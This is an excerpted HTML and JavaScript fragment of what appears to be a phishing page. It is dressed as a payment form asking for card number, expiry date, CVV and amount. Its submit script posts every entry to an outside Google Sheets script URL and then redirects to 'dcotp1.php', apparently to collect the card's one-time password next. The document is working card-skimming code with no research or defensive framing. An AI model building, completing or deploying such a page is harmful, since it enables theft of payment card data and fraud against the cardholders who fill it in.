...
<div class="container">
    <label for="email"><b>Debit / Credit card *</b></label>
    <input type="text" placeholder="Enter Debit / Credit card number " name="crdnumber" autocomplete="off" required>

   <label for="email"><b>Expiry date *</b></label>
    <input type="text" placeholder="MM / YEAR" name="date" autocomplete="off" required>

    <label for="psw-repeat"><b>CVV *</b></label>
    <input type="number" placeholder="Enter CVV" name="acvv" autocomplete="off" required>

 <label for="psw-repeat"><b>Amount *</b></label>
    <input type="number" placeholder="Enter Amount"  name="amount" autocomplete="off" required>
            ...
            const form = document.forms['google-sheet']
             ...
             form.addEventListener('submit', e => {
               ...
               fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                 .then(response =>  window.location.href='dcotp1.php')
